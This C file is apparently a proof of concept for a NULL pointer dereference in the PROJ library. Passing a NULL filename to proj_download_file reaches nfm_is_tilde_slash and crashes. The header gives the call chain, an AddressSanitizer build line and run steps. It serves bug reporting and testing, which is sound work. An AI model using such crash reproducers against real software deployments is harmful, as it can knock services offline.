/*
 * PoC for SF24:
 * NULL pointer dereference in nfm_is_tilde_slash() via proj_download_file()
 * with NULL url_or_filename.
 *
 * Affected file: PROJ/src/networkfilemanager.cpp
 * Call chain:
 *   proj_download_file(ctx, NULL, ...)       line 2668
 *     -> proj_is_download_needed(ctx, NULL)  line 2680
 *       -> build_url(ctx, NULL)              line 2533
 *         -> nfm_is_tilde_slash(NULL)        line 2281 -> 2269 CRASH
 *
 * Crash: SEGV (READ from address 0x0) at networkfilemanager.cpp:2269
 *
 * Compile inside container:
 *   clang -std=c11 -fsanitize=address -g -O1 \
 *     -I/src/PROJ/src \
 *     net_SF24_poc.c \
 *     /proj4-build/lib/libproj.a \
 *     -lpthread /host-lib/libsqlite3.so.0 -ldl -lm -lstdc++ \
 *     -o net_SF24_poc
 *
 * Run:
 *   ASAN_OPTIONS=detect_leaks=0 PROJ_DATA=/out/asan ./net_SF24_poc
 */

#include "proj.h"
#include <stdio.h>

static PROJ_NETWORK_HANDLE *my_open(
        PJ_CONTEXT *ctx, const char *url,
        unsigned long long offset, size_t size_to_read, void *buffer,
        size_t *out_size_read, size_t error_string_max_size,
        char *out_error_string, void *user_data) {
    return NULL;
}
static void my_close(PJ_CONTEXT *ctx, PROJ_NETWORK_HANDLE *handle,
        void *user_data) {}
static const char *my_get_header(PJ_CONTEXT *ctx, PROJ_NETWORK_HANDLE *handle,
        const char *header_name, void *user_data) { return NULL; }
static size_t my_read_range(PJ_CONTEXT *ctx, PROJ_NETWORK_HANDLE *handle,
        unsigned long long offset, size_t size_to_read, void *buffer,
        size_t error_string_max_size, char *out_error_string,
        void *user_data) { return 0; }

int main(void) {
    PJ_CONTEXT *ctx = proj_context_create();

    proj_context_set_network_callbacks(
        ctx, my_open, my_close, my_get_header, my_read_range, NULL);
    proj_context_set_enable_network(ctx, 1);

    printf("Network enabled: %d\n", proj_context_is_network_enabled(ctx));

    /* Passing NULL as url_or_filename via the higher-level download API:
       proj_download_file()
         -> proj_is_download_needed()
           -> build_url(ctx, NULL)
             -> nfm_is_tilde_slash(NULL)  <-- dereferences NULL pointer */
    printf("Triggering NULL deref via proj_download_file(ctx, NULL, ...)...\n");
    fflush(stdout);

    int result = proj_download_file(ctx, NULL, 0, NULL, NULL);
    printf("Result: %d  (unreachable)\n", result);

    proj_context_destroy(ctx);
    return 0;
}
